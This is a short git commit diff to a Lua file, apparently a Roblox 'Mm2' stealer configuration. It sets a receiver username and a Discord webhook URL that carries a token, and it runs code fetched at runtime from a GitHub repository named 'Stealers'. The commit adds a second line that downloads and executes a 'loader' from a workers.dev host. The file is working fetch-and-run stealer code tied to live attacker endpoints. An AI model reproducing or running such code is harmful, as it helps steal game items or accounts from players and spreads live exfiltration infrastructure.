a34acc826d379acfd4440e163196e3acd55c0f61
Mm2 <aqnhancfl@gmail.com>
2024-10-23 14:24:26 +0700

    .lua

--- .lua
+++ .lua
@@ -2,3 +2,4 @@ Receiver = "NoahTyrant"
 Webhook = "https://discord.com/api/webhooks/1261718729700409374/Pr05IfDSPvLPfkcBE3OuX9Y2Xq-2B8q_ScWa_DpxLvBAjjIL9Q0CEKyzJUof7OXBa_Nv"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjq/Stealers/main/losg.lua"))()
+loadstring(game:HttpGet("https://overdrive-h.ohd.workers.dev/?d=loader"))()
